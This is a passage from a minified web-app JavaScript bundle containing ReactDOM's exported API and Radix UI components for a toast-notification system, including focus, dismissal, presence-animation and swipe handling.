        throw typeof e.render == "function" ? Error(R(188)) : ((e = Object.keys(e).join(",")), Error(R(268, e)));
    return (e = Wf(t)), (e = e === null ? null : e.stateNode), e;
};
Je.flushSync = function (e) {
    return pr(e);
};
Je.hydrate = function (e, t, n) {
    if (!ga(t)) throw Error(R(200));
    return ya(null, e, t, !0, n);
};
Je.hydrateRoot = function (e, t, n) {
    if (!Eu(e)) throw Error(R(405));
    var r = (n != null && n.hydratedSources) || null,
        o = !1,
        s = "",
        i = kh;
    if (
        (n != null &&
            (n.unstable_strictMode === !0 && (o = !0),
            n.identifierPrefix !== void 0 && (s = n.identifierPrefix),
            n.onRecoverableError !== void 0 && (i = n.onRecoverableError)),
        (t = bh(t, null, e, 1, n ?? null, o, !1, s, i)),
        (e[en] = t.current),
        is(e),
        r)
    )
        for (e = 0; e < r.length; e++)
            (n = r[e]),
                (o = n._getVersion),
                (o = o(n._source)),
                t.mutableSourceEagerHydrationData == null
                    ? (t.mutableSourceEagerHydrationData = [n, o])
                    : t.mutableSourceEagerHydrationData.push(n, o);
    return new ha(t);
};
Je.render = function (e, t, n) {
    if (!ga(t)) throw Error(R(200));
    return ya(null, e, t, !1, n);
};
Je.unmountComponentAtNode = function (e) {
    if (!ga(e)) throw Error(R(40));
    return e._reactRootContainer
        ? (pr(function () {
              ya(null, null, e, !1, function () {
                  (e._reactRootContainer = null), (e[en] = null);
              });
          }),
          !0)
        : !1;
};
Je.unstable_batchedUpdates = vu;
Je.unstable_renderSubtreeIntoContainer = function (e, t, n, r) {
    if (!ga(n)) throw Error(R(200));
    if (e == null || e._reactInternals === void 0) throw Error(R(38));
    return ya(e, t, n, !1, r);
};
Je.version = "18.3.1-next-f1338f8080-20240426";
function Ch() {
    if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"))
        try {
            __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(Ch);
        } catch (e) {
            console.error(e);
        }
}
Ch(), (Cf.exports = Je);
var Ts = Cf.exports;
const Eh = df(Ts);
var Nh,
    cp = Ts;
(Nh = cp.createRoot), cp.hydrateRoot;
const G1 = 1,
    q1 = 1e6;
let sl = 0;
function X1() {
    return (sl = (sl + 1) % Number.MAX_SAFE_INTEGER), sl.toString();
}
const il = new Map(),
    up = (e) => {
        if (il.has(e)) return;
        const t = setTimeout(() => {
            il.delete(e), Xo({ type: "REMOVE_TOAST", toastId: e });
        }, q1);
        il.set(e, t);
    },
    Y1 = (e, t) => {
        switch (t.type) {
            case "ADD_TOAST":
                return { ...e, toasts: [t.toast, ...e.toasts].slice(0, G1) };
            case "UPDATE_TOAST":
                return { ...e, toasts: e.toasts.map((n) => (n.id === t.toast.id ? { ...n, ...t.toast } : n)) };
            case "DISMISS_TOAST": {
                const { toastId: n } = t;
                return (
                    n
                        ? up(n)
                        : e.toasts.forEach((r) => {
                              up(r.id);
                          }),
                    { ...e, toasts: e.toasts.map((r) => (r.id === n || n === void 0 ? { ...r, open: !1 } : r)) }
                );
            }
            case "REMOVE_TOAST":
                return t.toastId === void 0
                    ? { ...e, toasts: [] }
                    : { ...e, toasts: e.toasts.filter((n) => n.id !== t.toastId) };
        }
    },
    vi = [];
let xi = { toasts: [] };
function Xo(e) {
    (xi = Y1(xi, e)),
        vi.forEach((t) => {
            t(xi);
        });
}
function Z1({ ...e }) {
    const t = X1(),
        n = (o) => Xo({ type: "UPDATE_TOAST", toast: { ...o, id: t } }),
        r = () => Xo({ type: "DISMISS_TOAST", toastId: t });
    return (
        Xo({
            type: "ADD_TOAST",
            toast: {
                ...e,
                id: t,
                open: !0,
                onOpenChange: (o) => {
                    o || r();
                },
            },
        }),
        { id: t, dismiss: r, update: n }
    );
}
function J1() {
    const [e, t] = x.useState(xi);
    return (
        x.useEffect(
            () => (
                vi.push(t),
                () => {
                    const n = vi.indexOf(t);
                    n > -1 && vi.splice(n, 1);
                }
            ),
            [e]
        ),
        { ...e, toast: Z1, dismiss: (n) => Xo({ type: "DISMISS_TOAST", toastId: n }) }
    );
}
function Se(e, t, { checkForDefaultPrevented: n = !0 } = {}) {
    return function (o) {
        if ((e == null || e(o), n === !1 || !o.defaultPrevented)) return t == null ? void 0 : t(o);
    };
}
function dp(e, t) {
    if (typeof e == "function") return e(t);
    e != null && (e.current = t);
}
function Ph(...e) {
    return (t) => {
        let n = !1;
        const r = e.map((o) => {
            const s = dp(o, t);
            return !n && typeof s == "function" && (n = !0), s;
        });
        if (n)
            return () => {
                for (let o = 0; o < r.length; o++) {
                    const s = r[o];
                    typeof s == "function" ? s() : dp(e[o], null);
                }
            };
    };
}
function Nt(...e) {
    return x.useCallback(Ph(...e), e);
}
function va(e, t = []) {
    let n = [];
    function r(s, i) {
        const a = x.createContext(i),
            l = n.length;
        n = [...n, i];
        const u = (p) => {
            var g;
            const { scope: m, children: f, ...S } = p,
                v = ((g = m == null ? void 0 : m[e]) == null ? void 0 : g[l]) || a,
                w = x.useMemo(() => S, Object.values(S));
            return c.jsx(v.Provider, { value: w, children: f });
        };
        u.displayName = s + "Provider";
        function d(p, m) {
            var v;
            const f = ((v = m == null ? void 0 : m[e]) == null ? void 0 : v[l]) || a,
                S = x.useContext(f);
            if (S) return S;
            if (i !== void 0) return i;
            throw new Error(`\`${p}\` must be used within \`${s}\``);
        }
        return [u, d];
    }
    const o = () => {
        const s = n.map((i) => x.createContext(i));
        return function (a) {
            const l = (a == null ? void 0 : a[e]) || s;
            return x.useMemo(() => ({ [`__scope${e}`]: { ...a, [e]: l } }), [a, l]);
        };
    };
    return (o.scopeName = e), [r, ev(o, ...t)];
}
function ev(...e) {
    const t = e[0];
    if (e.length === 1) return t;
    const n = () => {
        const r = e.map((o) => ({ useScope: o(), scopeName: o.scopeName }));
        return function (s) {
            const i = r.reduce((a, { useScope: l, scopeName: u }) => {
                const p = l(s)[`__scope${u}`];
                return { ...a, ...p };
            }, {});
            return x.useMemo(() => ({ [`__scope${t.scopeName}`]: i }), [i]);
        };
    };
    return (n.scopeName = t.scopeName), n;
}
function dc(e) {
    const t = tv(e),
        n = x.forwardRef((r, o) => {
            const { children: s, ...i } = r,
                a = x.Children.toArray(s),
                l = a.find(rv);
            if (l) {
                const u = l.props.children,
                    d = a.map((p) =>
                        p === l
                            ? x.Children.count(u) > 1
                                ? x.Children.only(null)
                                : x.isValidElement(u)
                                  ? u.props.children
                                  : null
                            : p
                    );
                return c.jsx(t, { ...i, ref: o, children: x.isValidElement(u) ? x.cloneElement(u, void 0, d) : null });
            }
            return c.jsx(t, { ...i, ref: o, children: s });
        });
    return (n.displayName = `${e}.Slot`), n;
}
function tv(e) {
    const t = x.forwardRef((n, r) => {
        const { children: o, ...s } = n;
        if (x.isValidElement(o)) {
            const i = sv(o),
                a = ov(s, o.props);
            return o.type !== x.Fragment && (a.ref = r ? Ph(r, i) : i), x.cloneElement(o, a);
        }
        return x.Children.count(o) > 1 ? x.Children.only(null) : null;
    });
    return (t.displayName = `${e}.SlotClone`), t;
}
var Th = Symbol("radix.slottable");
function nv(e) {
    const t = ({ children: n }) => c.jsx(c.Fragment, { children: n });
    return (t.displayName = `${e}.Slottable`), (t.__radixId = Th), t;
}
function rv(e) {
    return x.isValidElement(e) && typeof e.type == "function" && "__radixId" in e.type && e.type.__radixId === Th;
}
function ov(e, t) {
    const n = { ...t };
    for (const r in t) {
        const o = e[r],
            s = t[r];
        /^on[A-Z]/.test(r)
            ? o && s
                ? (n[r] = (...a) => {
                      const l = s(...a);
                      return o(...a), l;
                  })
                : o && (n[r] = o)
            : r === "style"
              ? (n[r] = { ...o, ...s })
              : r === "className" && (n[r] = [o, s].filter(Boolean).join(" "));
    }
    return { ...e, ...n };
}
function sv(e) {
    var r, o;
    let t = (r = Object.getOwnPropertyDescriptor(e.props, "ref")) == null ? void 0 : r.get,
        n = t && "isReactWarning" in t && t.isReactWarning;
    return n
        ? e.ref
        : ((t = (o = Object.getOwnPropertyDescriptor(e, "ref")) == null ? void 0 : o.get),
          (n = t && "isReactWarning" in t && t.isReactWarning),
          n ? e.props.ref : e.props.ref || e.ref);
}
function iv(e) {
    const t = e + "CollectionProvider",
        [n, r] = va(t),
        [o, s] = n(t, { collectionRef: { current: null }, itemMap: new Map() }),
        i = (v) => {
            const { scope: w, children: g } = v,
                h = A.useRef(null),
                y = A.useRef(new Map()).current;
            return c.jsx(o, { scope: w, itemMap: y, collectionRef: h, children: g });
        };
    i.displayName = t;
    const a = e + "CollectionSlot",
        l = dc(a),
        u = A.forwardRef((v, w) => {
            const { scope: g, children: h } = v,
                y = s(a, g),
                b = Nt(w, y.collectionRef);
            return c.jsx(l, { ref: b, children: h });
        });
    u.displayName = a;
    const d = e + "CollectionItemSlot",
        p = "data-radix-collection-item",
        m = dc(d),
        f = A.forwardRef((v, w) => {
            const { scope: g, children: h, ...y } = v,
                b = A.useRef(null),
                k = Nt(w, b),
                C = s(d, g);
            return (
                A.useEffect(() => (C.itemMap.set(b, { ref: b, ...y }), () => void C.itemMap.delete(b))),
                c.jsx(m, { [p]: "", ref: k, children: h })
            );
        });
    f.displayName = d;
    function S(v) {
        const w = s(e + "CollectionConsumer", v);
        return A.useCallback(() => {
            const h = w.collectionRef.current;
            if (!h) return [];
            const y = Array.from(h.querySelectorAll(`[${p}]`));
            return Array.from(w.itemMap.values()).sort((C, E) => y.indexOf(C.ref.current) - y.indexOf(E.ref.current));
        }, [w.collectionRef, w.itemMap]);
    }
    return [{ Provider: i, Slot: u, ItemSlot: f }, S, r];
}
var av = [
        "a",
        "button",
        "div",
        "form",
        "h2",
        "h3",
        "img",
        "input",
        "label",
        "li",
        "nav",
        "ol",
        "p",
        "select",
        "span",
        "svg",
        "ul",
    ],
    Ke = av.reduce((e, t) => {
        const n = dc(`Primitive.${t}`),
            r = x.forwardRef((o, s) => {
                const { asChild: i, ...a } = o,
                    l = i ? n : t;
                return typeof window < "u" && (window[Symbol.for("radix-ui")] = !0), c.jsx(l, { ...a, ref: s });
            });
        return (r.displayName = `Primitive.${t}`), { ...e, [t]: r };
    }, {});
function jh(e, t) {
    e && Ts.flushSync(() => e.dispatchEvent(t));
}
function Fn(e) {
    const t = x.useRef(e);
    return (
        x.useEffect(() => {
            t.current = e;
        }),
        x.useMemo(
            () =>
                (...n) => {
                    var r;
                    return (r = t.current) == null ? void 0 : r.call(t, ...n);
                },
            []
        )
    );
}
function lv(e, t = globalThis == null ? void 0 : globalThis.document) {
    const n = Fn(e);
    x.useEffect(() => {
        const r = (o) => {
            o.key === "Escape" && n(o);
        };
        return (
            t.addEventListener("keydown", r, { capture: !0 }),
            () => t.removeEventListener("keydown", r, { capture: !0 })
        );
    }, [n, t]);
}
var cv = "DismissableLayer",
    pc = "dismissableLayer.update",
    uv = "dismissableLayer.pointerDownOutside",
    dv = "dismissableLayer.focusOutside",
    pp,
    Rh = x.createContext({ layers: new Set(), layersWithOutsidePointerEventsDisabled: new Set(), branches: new Set() }),
    Nu = x.forwardRef((e, t) => {
        const {
                disableOutsidePointerEvents: n = !1,
                onEscapeKeyDown: r,
                onPointerDownOutside: o,
                onFocusOutside: s,
                onInteractOutside: i,
                onDismiss: a,
                ...l
            } = e,
            u = x.useContext(Rh),
            [d, p] = x.useState(null),
            m = (d == null ? void 0 : d.ownerDocument) ?? (globalThis == null ? void 0 : globalThis.document),
            [, f] = x.useState({}),
            S = Nt(t, (E) => p(E)),
            v = Array.from(u.layers),
            [w] = [...u.layersWithOutsidePointerEventsDisabled].slice(-1),
            g = v.indexOf(w),
            h = d ? v.indexOf(d) : -1,
            y = u.layersWithOutsidePointerEventsDisabled.size > 0,
            b = h >= g,
            k = fv((E) => {
                const j = E.target,
                    _ = [...u.branches].some((M) => M.contains(j));
                !b || _ || (o == null || o(E), i == null || i(E), E.defaultPrevented || a == null || a());
            }, m),
            C = mv((E) => {
                const j = E.target;
                [...u.branches].some((M) => M.contains(j)) ||
                    (s == null || s(E), i == null || i(E), E.defaultPrevented || a == null || a());
            }, m);
        return (
            lv((E) => {
                h === u.layers.size - 1 && (r == null || r(E), !E.defaultPrevented && a && (E.preventDefault(), a()));
            }, m),
            x.useEffect(() => {
                if (d)
                    return (
                        n &&
                            (u.layersWithOutsidePointerEventsDisabled.size === 0 &&
                                ((pp = m.body.style.pointerEvents), (m.body.style.pointerEvents = "none")),
                            u.layersWithOutsidePointerEventsDisabled.add(d)),
                        u.layers.add(d),
                        fp(),
                        () => {
                            n &&
                                u.layersWithOutsidePointerEventsDisabled.size === 1 &&
                                (m.body.style.pointerEvents = pp);
                        }
                    );
            }, [d, m, n, u]),
            x.useEffect(
                () => () => {
                    d && (u.layers.delete(d), u.layersWithOutsidePointerEventsDisabled.delete(d), fp());
                },
                [d, u]
            ),
            x.useEffect(() => {
                const E = () => f({});
                return document.addEventListener(pc, E), () => document.removeEventListener(pc, E);
            }, []),
            c.jsx(Ke.div, {
                ...l,
                ref: S,
                style: { pointerEvents: y ? (b ? "auto" : "none") : void 0, ...e.style },
                onFocusCapture: Se(e.onFocusCapture, C.onFocusCapture),
                onBlurCapture: Se(e.onBlurCapture, C.onBlurCapture),
                onPointerDownCapture: Se(e.onPointerDownCapture, k.onPointerDownCapture),
            })
        );
    });
Nu.displayName = cv;
var pv = "DismissableLayerBranch",
    Ah = x.forwardRef((e, t) => {
        const n = x.useContext(Rh),
            r = x.useRef(null),
            o = Nt(t, r);
        return (
            x.useEffect(() => {
                const s = r.current;
                if (s)
                    return (
                        n.branches.add(s),
                        () => {
                            n.branches.delete(s);
                        }
                    );
            }, [n.branches]),
            c.jsx(Ke.div, { ...e, ref: o })
        );
    });
Ah.displayName = pv;
function fv(e, t = globalThis == null ? void 0 : globalThis.document) {
    const n = Fn(e),
        r = x.useRef(!1),
        o = x.useRef(() => {});
    return (
        x.useEffect(() => {
            const s = (a) => {
                    if (a.target && !r.current) {
                        let l = function () {
                            Mh(uv, n, u, { discrete: !0 });
                        };
                        const u = { originalEvent: a };
                        a.pointerType === "touch"
                            ? (t.removeEventListener("click", o.current),
                              (o.current = l),
                              t.addEventListener("click", o.current, { once: !0 }))
                            : l();
                    } else t.removeEventListener("click", o.current);
                    r.current = !1;
                },
                i = window.setTimeout(() => {
                    t.addEventListener("pointerdown", s);
                }, 0);
            return () => {
                window.clearTimeout(i),
                    t.removeEventListener("pointerdown", s),
                    t.removeEventListener("click", o.current);
            };
        }, [t, n]),
        { onPointerDownCapture: () => (r.current = !0) }
    );
}
function mv(e, t = globalThis == null ? void 0 : globalThis.document) {
    const n = Fn(e),
        r = x.useRef(!1);
    return (
        x.useEffect(() => {
            const o = (s) => {
                s.target && !r.current && Mh(dv, n, { originalEvent: s }, { discrete: !1 });
            };
            return t.addEventListener("focusin", o), () => t.removeEventListener("focusin", o);
        }, [t, n]),
        { onFocusCapture: () => (r.current = !0), onBlurCapture: () => (r.current = !1) }
    );
}
function fp() {
    const e = new CustomEvent(pc);
    document.dispatchEvent(e);
}
function Mh(e, t, n, { discrete: r }) {
    const o = n.originalEvent.target,
        s = new CustomEvent(e, { bubbles: !1, cancelable: !0, detail: n });
    t && o.addEventListener(e, t, { once: !0 }), r ? jh(o, s) : o.dispatchEvent(s);
}
var hv = Nu,
    gv = Ah,
    Un = globalThis != null && globalThis.document ? x.useLayoutEffect : () => {},
    yv = "Portal",
    _h = x.forwardRef((e, t) => {
        var a;
        const { container: n, ...r } = e,
            [o, s] = x.useState(!1);
        Un(() => s(!0), []);
        const i = n || (o && ((a = globalThis == null ? void 0 : globalThis.document) == null ? void 0 : a.body));
        return i ? Eh.createPortal(c.jsx(Ke.div, { ...r, ref: t }), i) : null;
    });
_h.displayName = yv;
function vv(e, t) {
    return x.useReducer((n, r) => t[n][r] ?? n, e);
}
var Pu = (e) => {
    const { present: t, children: n } = e,
        r = xv(t),
        o = typeof n == "function" ? n({ present: r.isPresent }) : x.Children.only(n),
        s = Nt(r.ref, wv(o));
    return typeof n == "function" || r.isPresent ? x.cloneElement(o, { ref: s }) : null;
};
Pu.displayName = "Presence";
function xv(e) {
    const [t, n] = x.useState(),
        r = x.useRef(null),
        o = x.useRef(e),
        s = x.useRef("none"),
        i = e ? "mounted" : "unmounted",
        [a, l] = vv(i, {
            mounted: { UNMOUNT: "unmounted", ANIMATION_OUT: "unmountSuspended" },
            unmountSuspended: { MOUNT: "mounted", ANIMATION_END: "unmounted" },
            unmounted: { MOUNT: "mounted" },
        });
    return (
        x.useEffect(() => {
            const u = Zs(r.current);
            s.current = a === "mounted" ? u : "none";
        }, [a]),
        Un(() => {
            const u = r.current,
                d = o.current;
            if (d !== e) {
                const m = s.current,
                    f = Zs(u);
                e
                    ? l("MOUNT")
                    : f === "none" || (u == null ? void 0 : u.display) === "none"
                      ? l("UNMOUNT")
                      : l(d && m !== f ? "ANIMATION_OUT" : "UNMOUNT"),
                    (o.current = e);
            }
        }, [e, l]),
        Un(() => {
            if (t) {
                let u;
                const d = t.ownerDocument.defaultView ?? window,
                    p = (f) => {
                        const v = Zs(r.current).includes(f.animationName);
                        if (f.target === t && v && (l("ANIMATION_END"), !o.current)) {
                            const w = t.style.animationFillMode;
                            (t.style.animationFillMode = "forwards"),
                                (u = d.setTimeout(() => {
                                    t.style.animationFillMode === "forwards" && (t.style.animationFillMode = w);
                                }));
                        }
                    },
                    m = (f) => {
                        f.target === t && (s.current = Zs(r.current));
                    };
                return (
                    t.addEventListener("animationstart", m),
                    t.addEventListener("animationcancel", p),
                    t.addEventListener("animationend", p),
                    () => {
                        d.clearTimeout(u),
                            t.removeEventListener("animationstart", m),
                            t.removeEventListener("animationcancel", p),
                            t.removeEventListener("animationend", p);
                    }
                );
            } else l("ANIMATION_END");
        }, [t, l]),
        {
            isPresent: ["mounted", "unmountSuspended"].includes(a),
            ref: x.useCallback((u) => {
                (r.current = u ? getComputedStyle(u) : null), n(u);
            }, []),
        }
    );
}
function Zs(e) {
    return (e == null ? void 0 : e.animationName) || "none";
}
function wv(e) {
    var r, o;
    let t = (r = Object.getOwnPropertyDescriptor(e.props, "ref")) == null ? void 0 : r.get,
        n = t && "isReactWarning" in t && t.isReactWarning;
    return n
        ? e.ref
        : ((t = (o = Object.getOwnPropertyDescriptor(e, "ref")) == null ? void 0 : o.get),
          (n = t && "isReactWarning" in t && t.isReactWarning),
          n ? e.props.ref : e.props.ref || e.ref);
}
var Sv = bf[" useInsertionEffect ".trim().toString()] || Un;
function bv({ prop: e, defaultProp: t, onChange: n = () => {}, caller: r }) {
    const [o, s, i] = kv({ defaultProp: t, onChange: n }),
        a = e !== void 0,
        l = a ? e : o;
    {
        const d = x.useRef(e !== void 0);
        x.useEffect(() => {
            const p = d.current;
            p !== a &&
                console.warn(
                    `${r} is changing from ${p ? "controlled" : "uncontrolled"} to ${a ? "controlled" : "uncontrolled"}. Components should not switch from controlled to uncontrolled (or vice versa). Decide between using a controlled or uncontrolled value for the lifetime of the component.`
                ),
                (d.current = a);
        }, [a, r]);
    }
    const u = x.useCallback(
        (d) => {
            var p;
            if (a) {
                const m = Cv(d) ? d(e) : d;
                m !== e && ((p = i.current) == null || p.call(i, m));
            } else s(d);
        },
        [a, e, s, i]
    );
    return [l, u];
}
function kv({ defaultProp: e, onChange: t }) {
    const [n, r] = x.useState(e),
        o = x.useRef(n),
        s = x.useRef(t);
    return (
        Sv(() => {
            s.current = t;
        }, [t]),
        x.useEffect(() => {
            var i;
            o.current !== n && ((i = s.current) == null || i.call(s, n), (o.current = n));
        }, [n, o]),
        [n, r, s]
    );
}
function Cv(e) {
    return typeof e == "function";
}
var Ev = Object.freeze({
        position: "absolute",
        border: 0,
        width: 1,
        height: 1,
        padding: 0,
        margin: -1,
        overflow: "hidden",
        clip: "rect(0, 0, 0, 0)",
        whiteSpace: "nowrap",
        wordWrap: "normal",
    }),
    Nv = "VisuallyHidden",
    xa = x.forwardRef((e, t) => c.jsx(Ke.span, { ...e, ref: t, style: { ...Ev, ...e.style } }));
xa.displayName = Nv;
var Pv = xa,
    Tu = "ToastProvider",
    [ju, Tv, jv] = iv("Toast"),
    [Lh, uk] = va("Toast", [jv]),
    [Rv, wa] = Lh(Tu),
    Oh = (e) => {
        const {
                __scopeToast: t,
                label: n = "Notification",
                duration: r = 5e3,
                swipeDirection: o = "right",
                swipeThreshold: s = 50,
                children: i,
            } = e,
            [a, l] = x.useState(null),
            [u, d] = x.useState(0),
            p = x.useRef(!1),
            m = x.useRef(!1);
        return (
            n.trim() || console.error(`Invalid prop \`label\` supplied to \`${Tu}\`. Expected non-empty \`string\`.`),
            c.jsx(ju.Provider, {
                scope: t,
                children: c.jsx(Rv, {
                    scope: t,
                    label: n,
                    duration: r,
                    swipeDirection: o,
                    swipeThreshold: s,
                    toastCount: u,
                    viewport: a,
                    onViewportChange: l,
                    onToastAdd: x.useCallback(() => d((f) => f + 1), []),
                    onToastRemove: x.useCallback(() => d((f) => f - 1), []),
                    isFocusedToastEscapeKeyDownRef: p,
                    isClosePausedRef: m,
                    children: i,
                }),
            })
        );
    };
Oh.displayName = Tu;
var Ih = "ToastViewport",
    Av = ["F8"],
    fc = "toast.viewportPause",
    mc = "toast.viewportResume",
    Dh = x.forwardRef((e, t) => {
        const { __scopeToast: n, hotkey: r = Av, label: o = "Notifications ({hotkey})", ...s } = e,
            i = wa(Ih, n),
            a = Tv(n),
            l = x.useRef(null),
            u = x.useRef(null),
            d = x.useRef(null),
            p = x.useRef(null),
            m = Nt(t, p, i.onViewportChange),
            f = r.join("+").replace(/Key/g, "").replace(/Digit/g, ""),
            S = i.toastCount > 0;
        x.useEffect(() => {
            const w = (g) => {
                var y;
                r.length !== 0 && r.every((b) => g[b] || g.code === b) && ((y = p.current) == null || y.focus());
            };
            return document.addEventListener("keydown", w), () => document.removeEventListener("keydown", w);
        }, [r]),
            x.useEffect(() => {
                const w = l.current,
                    g = p.current;
                if (S && w && g) {
                    const h = () => {
                            if (!i.isClosePausedRef.current) {
                                const C = new CustomEvent(fc);
                                g.dispatchEvent(C), (i.isClosePausedRef.current = !0);
                            }
                        },
                        y = () => {
                            if (i.isClosePausedRef.current) {
                                const C = new CustomEvent(mc);
                                g.dispatchEvent(C), (i.isClosePausedRef.current = !1);
                            }
                        },
                        b = (C) => {
                            !w.contains(C.relatedTarget) && y();
                        },
                        k = () => {
                            w.contains(document.activeElement) || y();
                        };
                    return (
                        w.addEventListener("focusin", h),
                        w.addEventListener("focusout", b),
                        w.addEventListener("pointermove", h),
                        w.addEventListener("pointerleave", k),
                        window.addEventListener("blur", h),
                        window.addEventListener("focus", y),
                        () => {
                            w.removeEventListener("focusin", h),
                                w.removeEventListener("focusout", b),
                                w.removeEventListener("pointermove", h),
                                w.removeEventListener("pointerleave", k),
                                window.removeEventListener("blur", h),
                                window.removeEventListener("focus", y);
                        }
                    );
                }
            }, [S, i.isClosePausedRef]);
        const v = x.useCallback(
            ({ tabbingDirection: w }) => {
                const h = a().map((y) => {
                    const b = y.ref.current,
                        k = [b, ...Vv(b)];
                    return w === "forwards" ? k : k.reverse();
                });
                return (w === "forwards" ? h.reverse() : h).flat();
            },
            [a]
        );
        return (
            x.useEffect(() => {
                const w = p.current;
                if (w) {
                    const g = (h) => {
                        var k, C, E;
                        const y = h.altKey || h.ctrlKey || h.metaKey;
                        if (h.key === "Tab" && !y) {
                            const j = document.activeElement,
                                _ = h.shiftKey;
                            if (h.target === w && _) {
                                (k = u.current) == null || k.focus();
                                return;
                            }
                            const D = v({ tabbingDirection: _ ? "backwards" : "forwards" }),
                                G = D.findIndex((O) => O === j);
                            al(D.slice(G + 1))
                                ? h.preventDefault()
                                : _
                                  ? (C = u.current) == null || C.focus()
                                  : (E = d.current) == null || E.focus();
                        }
                    };
                    return w.addEventListener("keydown", g), () => w.removeEventListener("keydown", g);
                }
            }, [a, v]),
            c.jsxs(gv, {
                ref: l,
                role: "region",
                "aria-label": o.replace("{hotkey}", f),
                tabIndex: -1,
                style: { pointerEvents: S ? void 0 : "none" },
                children: [
                    S &&
                        c.jsx(hc, {
                            ref: u,
                            onFocusFromOutsideViewport: () => {
                                const w = v({ tabbingDirection: "forwards" });
                                al(w);
                            },
                        }),
                    c.jsx(ju.Slot, { scope: n, children: c.jsx(Ke.ol, { tabIndex: -1, ...s, ref: m }) }),
                    S &&
                        c.jsx(hc, {
                            ref: d,
                            onFocusFromOutsideViewport: () => {
                                const w = v({ tabbingDirection: "backwards" });
                                al(w);
                            },
                        }),
                ],
            })
        );
    });
Dh.displayName = Ih;
var zh = "ToastFocusProxy",
    hc = x.forwardRef((e, t) => {
        const { __scopeToast: n, onFocusFromOutsideViewport: r, ...o } = e,
            s = wa(zh, n);
        return c.jsx(xa, {
            "aria-hidden": !0,
            tabIndex: 0,
            ...o,
            ref: t,
            style: { position: "fixed" },
            onFocus: (i) => {
                var u;
                const a = i.relatedTarget;
                !((u = s.viewport) != null && u.contains(a)) && r();
            },
        });
    });
hc.displayName = zh;
var js = "Toast",
    Mv = "toast.swipeStart",
    _v = "toast.swipeMove",
    Lv = "toast.swipeCancel",
    Ov = "toast.swipeEnd",
    Fh = x.forwardRef((e, t) => {
        const { forceMount: n, open: r, defaultOpen: o, onOpenChange: s, ...i } = e,
            [a, l] = bv({ prop: r, defaultProp: o ?? !0, onChange: s, caller: js });
        return c.jsx(Pu, {
            present: n || a,
            children: c.jsx(zv, {
                open: a,
                ...i,
                ref: t,
                onClose: () => l(!1),
                onPause: Fn(e.onPause),
                onResume: Fn(e.onResume),
                onSwipeStart: Se(e.onSwipeStart, (u) => {
                    u.currentTarget.setAttribute("data-swipe", "start");
                }),
                onSwipeMove: Se(e.onSwipeMove, (u) => {
                    const { x: d, y: p } = u.detail.delta;
                    u.currentTarget.setAttribute("data-swipe", "move"),
                        u.currentTarget.style.setProperty("--radix-toast-swipe-move-x", `${d}px`),
                        u.currentTarget.style.setProperty("--radix-toast-swipe-move-y", `${p}px`);
                }),
                onSwipeCancel: Se(e.onSwipeCancel, (u) => {
                    u.currentTarget.setAttribute("data-swipe", "cancel"),
                        u.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"),
                        u.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"),
                        u.currentTarget.style.removeProperty("--radix-toast-swipe-end-x"),
                        u.currentTarget.style.removeProperty("--radix-toast-swipe-end-y");
                }),
                onSwipeEnd: Se(e.onSwipeEnd, (u) => {
                    const { x: d, y: p } = u.detail.delta;
                    u.currentTarget.setAttribute("data-swipe", "end"),
                        u.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"),
                        u.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"),
                        u.currentTarget.style.setProperty("--radix-toast-swipe-end-x", `${d}px`),
                        u.currentTarget.style.setProperty("--radix-toast-swipe-end-y", `${p}px`),
                        l(!1);
                }),
            }),
        });
    });
Fh.displayName = js;
var [Iv, Dv] = Lh(js, { onClose() {} }),
    zv = x.forwardRef((e, t) => {
        const {
                __scopeToast: n,
                type: r = "foreground",
                duration: o,
                open: s,
                onClose: i,
                onEscapeKeyDown: a,
                onPause: l,
                onResume: u,
                onSwipeStart: d,
                onSwipeMove: p,
                onSwipeCancel: m,
                onSwipeEnd: f,
                ...S
            } = e,
            v = wa(js, n),
            [w, g] = x.useState(null),
            h = Nt(t, (O) => g(O)),
            y = x.useRef(null),
            b = x.useRef(null),
            k = o || v.duration,
            C = x.useRef(0),
            E = x.useRef(k),
            j = x.useRef(0),
            { onToastAdd: _, onToastRemove: M } = v,
            H = Fn(() => {
                var $;
                (w == null ? void 0 : w.contains(document.activeElement)) && (($ = v.viewport) == null || $.focus()),
                    i();
            }),
            D = x.useCallback(
                (O) => {
                    !O ||
                        O === 1 / 0 ||
                        (window.clearTimeout(j.current),
                        (C.current = new Date().getTime()),
                        (j.current = window.setTimeout(H, O)));
                },
                [H]
            );
        x.useEffect(() => {
            const O = v.viewport;
            if (O) {
                const $ = () => {
                        D(E.current), u == null || u();
                    },
                    B = () => {
                        const I = new Date().getTime() - C.current;
                        (E.current = E.current - I), window.clearTimeout(j.current), l == null || l();
                    };
                return (
                    O.addEventListener(fc, B),
                    O.addEventListener(mc, $),
                    () => {
                        O.removeEventListener(fc, B), O.removeEventListener(mc, $);
                    }
                );
            }
        }, [v.viewport, k, l, u, D]),
            x.useEffect(() => {
                s && !v.isClosePausedRef.current && D(k);
            }, [s, k, v.isClosePausedRef, D]),
            x.useEffect(() => (_(), () => M()), [_, M]);
        const G = x.useMemo(() => (w ? Kh(w) : null), [w]);
        return v.viewport
            ? c.jsxs(c.Fragment, {
                  children: [
                      G &&
                          c.jsx(Fv, {
                              __scopeToast: n,
                              role: "status",
                              "aria-live": r === "foreground" ? "assertive" : "polite",
                              "aria-atomic": !0,
                              children: G,
                          }),
                      c.jsx(Iv, {
                          scope: n,
                          onClose: H,
                          children: Ts.createPortal(
                              c.jsx(ju.ItemSlot, {
                                  scope: n,
                                  children: c.jsx(hv, {
                                      asChild: !0,
                                      onEscapeKeyDown: Se(a, () => {
                                          v.isFocusedToastEscapeKeyDownRef.current || H(),
                                              (v.isFocusedToastEscapeKeyDownRef.current = !1);
                                      }),
                                      children: c.jsx(Ke.li, {
                                          role: "status",
                                          "aria-live": "off",
                                          "aria-atomic": !0,
                                          tabIndex: 0,
                                          "data-state": s ? "open" : "closed",
                                          "data-swipe-direction": v.swipeDirection,
                                          ...S,
                                          ref: h,
                                          style: { userSelect: "none", touchAction: "none", ...e.style },
                                          onKeyDown: Se(e.onKeyDown, (O) => {
                                              O.key === "Escape" &&
                                                  (a == null || a(O.nativeEvent),
                                                  O.nativeEvent.defaultPrevented ||
                                                      ((v.isFocusedToastEscapeKeyDownRef.current = !0), H()));
                                          }),
